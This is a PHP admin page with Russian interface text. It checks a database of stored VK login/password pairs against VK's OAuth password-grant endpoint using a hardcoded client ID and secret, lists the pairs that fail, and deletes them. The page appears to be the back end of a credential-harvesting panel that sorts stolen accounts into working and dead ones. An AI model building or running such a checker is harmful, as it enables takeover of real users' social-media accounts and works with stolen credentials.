<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Adm | Невалид</title>
  <style>
  body {
	  font-family: "Source Sans Pro",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";
  }
</style>
</head>
<body>
</body>
</html>
<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {

$query = "select id,login,pass from data";
$result = $db->query($query);	
$val = 0;

echo "Список удаленных НЕВАЛИД аккаунтов:<br><hr noshade size=1 width=280 color=black align=left>";
while($row = mysqli_fetch_array($result)) {
$username = $row['login'];
$password = $row['pass'];
$delid = $row['id'];
$check = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
if (strpos($check, "access_token") === false)
		{   
	        echo $row['login'].":".$row['pass']."<br>";
			$val = $val + 1;
			$db->query("DELETE FROM data WHERE id = $delid") or die (mysql_error());
			$db->query("ALTER TABLE data AUTO_INCREMENT = 1");
			
		}

}
echo "<hr noshade size=1 width=280 color=black align=left>Аккаунтов удалено: ".$val;

} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=auth.php">'; }